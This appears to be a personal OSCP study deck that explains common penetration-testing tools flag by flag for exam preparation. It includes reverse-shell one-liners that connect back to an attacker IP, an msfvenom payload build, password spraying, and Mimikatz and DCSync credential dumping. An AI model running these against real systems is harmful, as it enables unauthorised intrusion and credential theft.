# 🧰 OSCP Tools Reference — My Revision Deck

> The tools I've already got my hands on, as quick tool-cards.
> Each card: **what it is → when I reach for it → the go-to command, broken down → the one thing to never forget.**
> This is a *living* file — every time a box teaches me a new flag, it comes back here.

**Legend:** 🟢 = I use this comfortably · 🟡 = used it, still building fluency · 💡 = the thing to memorise

---

## 📖 How to read a command (the habit)

Before any card, the golden rule: **never paste a command you can't read.** Every flag has a job. On the exam you'll need to *change* commands on the fly, and you can only change what you understand.

```bash
nmap -sC -sV -oN nmap/initial 10.10.10.10
```
| Part | Job |
|------|-----|
| `nmap` | the program you're running |
| `-sC` | **s**cript scan — run Nmap's *default* safe scripts |
| `-sV` | **V**ersion detection — what software + version is on each port |
| `-oN nmap/initial` | **o**utput in **N**ormal format to the file `nmap/initial` |
| `10.10.10.10` | the target |

Read every card this way.

---

# 1) 🔍 Recon & Enumeration

### 🟢 Nmap — the port & service scanner
**What it is:** the tool that tells you *what's listening* on a target and *what software* it is. Your first move on every single box.
**Reach for it when:** you have an IP and nothing else.

```bash
# Step 1 — fast, find open ports across ALL 65535 ports
nmap -p- --min-rate 1000 -oN nmap/allports 10.10.10.10

# Step 2 — deep scan ONLY the open ports you found
nmap -p 22,80,445 -sC -sV -oN nmap/deep 10.10.10.10
```
- `-p-` → scan **all** 65535 ports (default is only top 1000 — boxes hide services high up)
- `--min-rate 1000` → send ≥1000 packets/sec (speeds up the full scan)
- `-p 22,80,445` → scan only these specific ports
- `-sC` → default NSE scripts · `-sV` → version detection
- `-oN <file>` → save normal output (always save your scans!)
- `-sU` → **UDP** scan (slow, but SNMP/TFTP/DNS live here — don't forget UDP)

💡 **Two-step scan every time:** all-ports fast → then deep-scan the open ones. Missing `-p-` is the #1 reason people get stuck.

---

### 🟢 Gobuster — directory & file brute-forcer (web)
**What it is:** hammers a web server with a wordlist to find hidden pages/folders (`/admin`, `/backup`, `/dev`).
**Reach for it when:** port 80/443 is open and the homepage looks empty.

```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40
```
- `dir` → directory/file brute mode
- `-u` → target URL
- `-w` → wordlist to use
- `-x php,txt,html` → also try these file **extensions** on each word
- `-t 40` → 40 threads (faster)

💡 Same job, newer cousins: **`feroxbuster`** (recursive, auto-digs into found folders) and **`ffuf`** (fuzzing, great for parameters & vhosts). Learn `ffuf` for Phase 1.

---

### 🟡 enum4linux-ng — SMB / Windows share enumerator
**What it is:** one command that dumps everything a Windows/Samba box will tell you unauthenticated — users, shares, groups, OS info.
**Reach for it when:** ports 139/445 (SMB) are open.

```bash
enum4linux-ng -A 10.10.10.10
```
- `-A` → do **all** the simple enumeration
- `10.10.10.10` → target

💡 SMB is a goldmine for **usernames** (which feed password attacks) and **open shares** (which leak creds/configs).

---

### 🟡 smbclient — browse SMB shares like an FTP client
**What it is:** connect to and download from Windows file shares.
```bash
smbclient -L //10.10.10.10/ -N            # list shares, -N = no password (null session)
smbclient //10.10.10.10/ShareName -N      # connect into a share
```
- `-L` → **L**ist available shares
- `-N` → **N**o password (try the anonymous/null session first — it often works!)
- inside: `ls`, `get file.txt`, `mget *` (download)

💡 Always try the **null session** (`-N`) first. Free files, no creds needed.

---

# 2) 🌐 Web

### 🟡 Burp Suite — the web proxy
**What it is:** sits between your browser and the website so you can **see, pause, and edit** every request. The Swiss-army knife of web hacking.
**Reach for it when:** you're attacking any web app — logins, forms, APIs, uploads.
**Key parts to know:**
- **Proxy → Intercept** → pause a request, edit it, forward it
- **Repeater** → send the same request over and over with tweaks (your main manual-testing tool)
- **Intruder** → automate sending many payloads (fuzzing) — throttled in the free Community edition
- **Decoder** → encode/decode Base64, URL, hex fast

💡 Set Firefox to use Burp as its proxy (127.0.0.1:8080) + install Burp's CA cert, or HTTPS breaks. **Repeater is where you'll live.**

---

# 3) 🔑 Passwords & Hashes

### 🟢 Hydra — online brute-forcer (live login services)
**What it is:** throws username/password guesses at a *live* service (SSH, FTP, HTTP login form, RDP) until one works.
**Reach for it when:** you have a login and a hunch about weak creds.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
```
- `-l admin` → single **l**ogin name (use `-L users.txt` for a list)
- `-P rockyou.txt` → **P**assword list (use `-p` for a single password)
- `ssh://10.10.10.10` → service + target

HTTP POST form (harder — needs the failure message):
```bash
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
```
- `^USER^`/`^PASS^` → where Hydra injects guesses
- `:Invalid` → the text shown on a **failed** login (how Hydra knows it failed)

💡 Online brute-forcing is **loud and slow**. It's a last resort, not a first move. Enumerate for real creds first.

---

### 🟢 John the Ripper — offline hash cracker
**What it is:** takes a password **hash** you looted and cracks it back to plaintext, offline.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt          # show already-cracked results
```
- `--wordlist=` → the dictionary to try
- `hashes.txt` → file of hashes (one per line)
- `--show` → print what's been cracked

Helper — identify the hash type first:
```bash
hashid '$1$abc...'      # what kind of hash is this?
```

💡 Use `unshadow /etc/passwd /etc/shadow > out` to combine Linux files before cracking. Know the difference between a **hash** (crack it) and a **cipher** (decrypt it).

---

### 🟡 Hashcat — GPU hash cracker (John's faster cousin)
**What it is:** same job as John but built for raw speed with mode numbers.
```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
```
- `-m 1000` → hash **mode** (1000 = NTLM, 0 = MD5, 1800 = sha512crypt…)
- `-a 0` → **a**ttack mode 0 = straight wordlist
- then: hashes file, then wordlist

💡 On the exam laptop (no GPU) John is often easier; Hashcat shines for NTLM/AD hashes. Keep a note of the mode numbers you meet.

---

# 4) 🐚 Shells & File Transfer

### 🟢 Netcat (nc) — the network Swiss army knife
**What it is:** reads/writes raw network connections. You use it mainly to **catch reverse shells**.
```bash
# Your listener (attacker) — catch an incoming shell
nc -lvnp 4444
```
- `-l` → **l**isten mode · `-v` → **v**erbose · `-n` → no DNS lookups · `-p 4444` → **p**ort to listen on

```bash
# On the victim (one way) — connect back to you
nc 10.8.0.5 4444 -e /bin/bash
```
- `-e /bin/bash` → run bash and pipe it over the connection

💡 The pattern to burn in: **listener first (attacker), then trigger the shell (victim connects back).** Port 4444 is just habit — any port works.

---

### 🟡 socat — netcat on steroids (stable & encrypted shells)
**What it is:** like netcat but gives you a *fully interactive*, optionally **encrypted** shell.
```bash
# Attacker listener
socat -d -d TCP-LISTEN:4444 STDOUT
# Victim
socat TCP:10.8.0.5:4444 EXEC:/bin/bash
```
💡 Use socat when you need a stable shell or to slip past inspection with `OPENSSL` encryption. Netcat for quick, socat for solid.

---

### 💡 Shell stabilisation (memorise this ritual)
A raw reverse shell is dumb (no tab-complete, Ctrl-C kills it). Upgrade it:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # 1. get a proper TTY
export TERM=xterm                                 # 2. enable clear/less/nano
# 3. press Ctrl-Z (background the shell), then on YOUR box:
stty raw -echo; fg                                # 4. hand your terminal's keys to the shell
```
💡 This exact sequence turns a fragile shell into a usable one. Practise until it's muscle memory.

---

# 5) 💥 Exploitation

### 🟢 searchsploit — offline Exploit-DB search
**What it is:** searches a local copy of Exploit-DB for public exploits matching a software + version.
```bash
searchsploit apache 2.4.49
searchsploit -m 50383                # -m = mirror (copy) exploit 50383 into your folder
```
- first arg(s) → keywords (software + version)
- `-m <id>` → copy that exploit locally to edit/run

💡 Feed it the **exact version** Nmap's `-sV` found. Then always read the exploit before running it.

---

### 🟢 msfvenom — payload generator
**What it is:** builds the malicious payload (reverse shell) as an `.exe`, `.elf`, `.php`, etc.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.5 LPORT=4444 -f exe -o shell.exe
```
- `-p windows/x64/shell_reverse_tcp` → the **p**ayload (OS/arch/type)
- `LHOST` → **your** IP (where the shell calls back) · `LPORT` → your listening port
- `-f exe` → output **f**ormat · `-o shell.exe` → **o**utput file

💡 `LHOST` is *your* attack IP, not the target's. Getting these backwards is the classic beginner bug.

---

### 🟡 Metasploit (msfconsole) — the exploitation framework
**What it is:** a huge database of ready-to-run exploits + post-exploitation tools.
```
msfconsole                       # launch
search <software>                # find a module
use <module/path>                # select it
show options                     # what it needs
set RHOSTS 10.10.10.10           # target
set LHOST 10.8.0.5               # you
run                              # fire
```
💡 **EXAM RULE:** Metasploit may be used on **ONE** machine only, and **never for pivoting**. Treat it as a single lifeline — build your skills without it.

---

### 🟡 Meterpreter — Metasploit's advanced payload
**What it is:** the powerful shell you get from many MSF exploits. Runs in memory, does post-exploitation.
```
getuid            # who am I
sysinfo           # OS details
hashdump          # dump password hashes (Windows)
background        # drop back to msfconsole, keep the session
search -f *.txt   # find files
```
💡 `shell` drops you to a normal OS shell; `background` + `sessions -i <id>` switches between them.

---

# 6) 🏰 Active Directory (your FYP arsenal — 40% of the exam)

### 🟢 NetExec (nxc) — the AD multi-tool *(formerly CrackMapExec)*
**What it is:** sweeps a network over SMB/WinRM/LDAP to test creds, spray passwords, list shares, and pull loot — at scale.
```bash
nxc smb 10.10.10.0/24 -u users.txt -p 'Password1'      # password spray across a subnet
nxc smb 10.10.10.10 -u bob -p 'Pass' --shares          # what can bob read?
```
- `smb` → the protocol (also `winrm`, `ldap`, `mssql`)
- `-u` / `-p` → user(s) / password(s)
- `--shares` → list shares this user can access

💡 A green **`(Pwn3d!)`** next to a host means those creds are admin there — instant win. This is your password-spraying workhorse.

---

### 🟢 Impacket — the Python AD attack toolkit
**What it is:** a *suite* of scripts that speak Windows protocols. Your Kerberos-attack and remote-exec toolbox.

| Script | What it does |
|--------|--------------|
| `GetUserSPNs.py` | **Kerberoasting** — pull crackable hashes for service accounts |
| `GetNPUsers.py` | **AS-REP roasting** — hashes for users with pre-auth disabled |
| `secretsdump.py` | dump all password hashes from a DC (post-DA) |
| `psexec.py` / `wmiexec.py` | get a shell on a Windows host with creds/hash |

```bash
impacket-GetUserSPNs corp.local/bob:Pass123 -dc-ip 10.10.10.10 -request
```
- `corp.local/bob:Pass123` → domain/user:password
- `-dc-ip` → the Domain Controller's IP
- `-request` → actually request the crackable tickets

💡 You already did Kerberoasting + AS-REP roasting in your FYP — these are the exact scripts behind it.

---

### 🟢 BloodHound + SharpHound — the AD map
**What it is:** **SharpHound** collects the data (users, groups, sessions, ACLs); **BloodHound** draws it as a graph so you can *see* the shortest path to Domain Admin.
```
# collector, run on/against the domain:
SharpHound.exe -c All
# or from Kali:
bloodhound-python -u bob -p Pass -d corp.local -ns 10.10.10.10 -c All
```
💡 Its killer feature: right-click your owned user → **"Shortest paths to Domain Admins."** BloodHound turns a maze into a to-do list.

---

### 🟡 Responder — LLMNR/NBT-NS poisoning
**What it is:** pretends to be other machines on the network to capture password hashes as they fly past.
```bash
responder -I tun0
```
- `-I tun0` → the network **I**nterface to listen on (your VPN interface in labs)

💡 Great for grabbing an initial foothold hash on internal networks. Pairs with John/Hashcat to crack what you catch.

---

### 🟡 Mimikatz — Windows credential dumper
**What it is:** rips plaintext passwords, hashes, and Kerberos tickets out of Windows memory. The classic post-exploitation tool.
```
privilege::debug          # get the rights it needs
sekurlsa::logonpasswords  # dump creds from memory
lsadump::dcsync /user:krbtgt   # DCSync — pull any hash from the DC
```
💡 Needs local admin/SYSTEM first. `sekurlsa::logonpasswords` is the money command.

---

## 🎯 The 12 things to never forget

1. **Enumerate first, always.** 90% of OSCP is enumeration. If stuck → enumerate harder, not exploit harder.
2. **`nmap -p-`** — scan *all* ports, then deep-scan the open ones.
3. **Don't forget UDP** (`nmap -sU`) — SNMP/TFTP hide there.
4. **`LHOST` is YOU**, `RHOST`/target is them.
5. **Listener first, shell second** (start `nc -lvnp` *before* triggering the payload).
6. **Stabilise every shell** (`python3 pty` → `stty raw -echo; fg`).
7. **Try null/anonymous sessions** on SMB & FTP before anything else.
8. **Read the exploit before you run it** — never blind-run code from the internet.
9. **Metasploit = 1 machine only**, never for pivoting. (Exam rule.)
10. **Save every scan to a file** (`-oN`) — you'll need them for the report.
11. **Crack hashes offline** (John/Hashcat); **brute logins online** (Hydra) only as last resort.
12. **BloodHound** shows the path to DA — let the graph plan your AD attack.

---

*Maintained as part of my [OSCP Preparation](../README.md) journey. Last habit: if a box teaches me a flag, it lands here the same day.*
